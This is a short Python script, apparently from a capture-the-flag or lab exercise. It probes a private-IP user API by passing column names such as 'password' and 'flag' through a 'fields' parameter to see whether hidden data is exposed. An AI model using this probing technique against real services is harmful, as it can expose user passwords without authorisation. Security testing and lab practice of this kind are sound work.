#!/usr/bin/env python3
import requests
import json
import time

BASE_URL = "http://192.168.100.110:3333"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}


def check_col(col_name):
    params = {"user_type": "students", "fields": f"student_id,{col_name}"}
    try:
        resp = requests.get(f"{BASE_URL}/api/v1/users", params=params, headers=HEADERS)
        if resp.status_code != 200:
            return f"Error: {resp.status_code}"

        data = resp.json()
        if "users" in data and len(data["users"]) > 0:
            val = data["users"][0].get(col_name, "MISSING")
            return f"Value: {val}"
        return "No users returned"
    except Exception as e:
        return f"Exception: {e}"


print(f"Checking 'password': {check_col('password')}")
print(f"Checking 'flag': {check_col('flag')}")
print(f"Checking 'completely_random_xyz_123': {check_col('completely_random_xyz_123')}")
